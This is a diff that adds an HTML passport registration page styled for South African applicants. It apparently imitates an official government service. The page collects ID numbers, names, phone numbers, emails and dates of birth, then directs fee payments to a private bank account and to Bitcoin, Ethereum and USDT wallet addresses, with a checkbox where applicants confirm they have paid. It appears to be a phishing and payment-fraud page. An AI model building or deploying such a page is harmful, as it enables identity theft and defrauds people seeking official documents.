@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Passport Registration</title>
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+  <link rel="stylesheet" href="/css/registration.css">
+  <script src="/js/scripts.js" defer></script>
+</head>
+<body>
+  <div class="container mt-5">
+    <h2 class="mb-4">Step 1: Profile Registration</h2>
+    <form action="/register" method="POST">
+      <fieldset class="border p-4 mb-4">
+        <legend class="w-auto">Enter Personal Details</legend>
+        <div class="form-group">
+          <label>South African ID number:</label>
+          <input type="text" name="idNumber" class="form-control" required>
+        </div>
+        <div class="form-group">
+          <label>Full name (as per ID):</label>
+          <input type="text" name="fullName" class="form-control" required>
+        </div>
+        <div class="form-group">
+          <label>Valid cellphone number:</label>
+          <input type="text" name="cellphone" class="form-control" required>
+        </div>
+        <div class="form-group">
+          <label>Email address:</label>
+          <input type="email" name="email" class="form-control" required>
+        </div>
+      </fieldset>
+
+      <h2 class="mb-4">Step 2: Application Submission</h2>
+      <fieldset class="border p-4 mb-4">
+        <legend class="w-auto">Select Service & Complete Forms</legend>
+        <div class="form-group">
+          <label>Select Service:</label>
+          <select name="serviceType" class="form-control" disabled>
+            <option>Passport Application</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label>Choose Passport Type:</label>
+          <select name="passportType" class="form-control" required>
+            <option value="32-page">32-page</option>
+            <option value="48-page">48-page maxi</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label>Marital Status:</label>
+          <select name="maritalStatus" class="form-control" required>
+            <option value="Single">Single</option>
+            <option value="Married">Married</option>
+            <option value="Divorced">Divorced</option>
+            <option value="Widow">Widow</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label>Employment:</label>
+          <input type="text" name="employment" class="form-control">
+        </div>
+        <div class="form-group">
+          <label>Emergency Contact:</label>
+          <input type="text" name="emergencyContact" class="form-control">
+        </div>
+        <div class="form-group">
+          <label>Date of Birth:</label>
+          <input type="date" name="dob" class="form-control" required>
+        </div>
+        <div class="form-group form-check">
+          <input type="checkbox" name="parentalConsent" class="form-check-input" id="parentalConsent">
+          <label class="form-check-label" for="parentalConsent">Parental Consent (if under 18)</label>
+        </div>
+      </fieldset>
+
+      <h2 class="mb-4">Step 3: Payment</h2>
+      <fieldset class="border p-4 mb-4">
+        <legend class="w-auto">Payment Details</legend>
+        <p>Fees:</p>
+        <ul>
+          <li>R600 (32-page passport)</li>
+          <li>R1,200 (48-page maxi passport)</li>
+        </ul>
+        <div class="form-group">
+          <label>Mode of Payment:</label>
+          <select name="paymentMode" id="paymentMode" class="form-control" required onchange="togglePaymentDetails()">
+            <option value="">Select Payment Mode</option>
+            <option value="Bank Transfer/Deposit">Bank Transfer/Deposit</option>
+            <option value="Cryptocurrency">Cryptocurrency</option>
+          </select>
+        </div>
+
+        <!-- Bank Transfer details -->
+        <div id="bankDetails" style="display:none;" class="border p-3 mb-3">
+          <h5>Bank Transfer/Deposit Details</h5>
+          <p><strong>Bank:</strong> FNB BANK</p>
+          <p><strong>Beneficiary Name:</strong> Mama pty</p>
+          <p><strong>Beneficiary Reference:</strong> 0672626266</p>
+          <p><strong>Account Number:</strong> 62509963139</p>
+          <p><strong>Payment Type:</strong> Immediate Payment (Just Once)</p>
+        </div>
+
+        <!-- Cryptocurrency details -->
+        <div id="cryptoDetails" style="display:none;" class="border p-3 mb-3">
+          <h5>Cryptocurrency Payment Details</h5>
+          <p><strong>Bitcoin Address:</strong> 
+            <span id="btcAddress">3Liim5xHAkLEgUjzfw2DNFqbEkzaXgWWu8</span> 
+            <button type="button" class="btn btn-sm btn-secondary" onclick="copyAddress('btcAddress')">Copy</button>
+          </p>
+          <p><strong>Ethereum Wallet Address:</strong> 
+            <span id="ethAddress">0x5F3C7599C24e2018ffb26856f9719dab1144455C</span> 
+            <button type="button" class="btn btn-sm btn-secondary" onclick="copyAddress('ethAddress')">Copy</button>
+          </p>
+          <p><strong>USDT (Tether) Wallet Address:</strong> 
+            <span id="usdtAddress">0x15B677f00Cba2311EFd3cE38CED5D7E8a621fCFF</span> 
+            <button type="button" class="btn btn-sm btn-secondary" onclick="copyAddress('usdtAddress')">Copy</button>
+          </p>
+        </div>
+        
+        <!-- Payment confirmation checkbox -->
+        <div class="form-group form-check">
+          <input type="checkbox" name="paymentConfirmed" class="form-check-input" id="paymentConfirmed">
+          <label class="form-check-label" for="paymentConfirmed">I confirm that I have made the payment</label>
+        </div>
+      </fieldset>
+      <button type="submit" class="btn btn-success btn-lg btn-block">Submit</button>
+    </form>
+  </div>
+</body>
+</html>
